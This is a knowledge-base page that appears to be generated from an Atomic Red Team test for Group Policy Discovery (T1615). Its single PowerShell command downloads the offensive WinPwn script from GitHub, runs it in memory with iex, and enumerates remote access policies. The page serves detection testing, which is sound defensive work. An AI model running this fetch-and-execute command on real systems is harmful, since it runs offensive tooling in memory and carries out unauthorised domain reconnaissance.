---
atomic_guid: "7230d01a-0a72-4bd5-9d7f-c6d472bc6a59"
title: "WinPwn - GPORemoteAccessPolicy"
framework: "atomic"
generated: "true"
attack_technique_id: "T1615"
attack_technique_name: "Group Policy Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1615/T1615.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "7230d01a-0a72-4bd5-9d7f-c6d472bc6a59"
  - "WinPwn - GPORemoteAccessPolicy"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# WinPwn - GPORemoteAccessPolicy

Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn

## Metadata

- Atomic GUID: 7230d01a-0a72-4bd5-9d7f-c6d472bc6a59
- Technique: T1615: Group Policy Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1615/T1615.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1615-group_policy_discovery|T1615]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPORemoteAccessPolicy -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1615/T1615.yaml)
